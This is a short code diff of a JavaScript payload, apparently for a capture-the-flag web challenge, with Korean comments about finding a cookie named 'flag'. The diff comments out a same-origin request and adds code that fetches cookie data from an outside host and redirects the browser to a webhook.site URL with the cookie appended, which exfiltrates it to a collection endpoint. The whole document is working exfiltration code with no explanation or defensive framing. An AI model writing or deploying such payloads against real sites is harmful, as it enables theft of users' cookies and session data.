@@ -1,4 +1,4 @@
-fetch('/api/v1/my_cookie_info')
+/*fetch('/api/v1/my_cookie_info')
   .then((response) => response.json())  // 응답을 JSON으로 파싱
   .then((data) => {
     // 쿠키 리스트 중에서 이름이 'flag'인 값을 찾음
@@ -14,4 +14,8 @@ fetch('/api/v1/my_cookie_info')
   })
   .catch((error) => {
     console.error('Error:', error);
-  });
+  });*/
+
+fetch("http://sflee.kro.kr:5555/api/v1/my_cookie_info")
+  .then((response) => response.json())
+  .then((data) => {var cookie = data.cookies[0]; location.href = "https://webhook.site/6f921727-420f-41a3-94c9-dab4e92db613/?flag=" + cookie;});
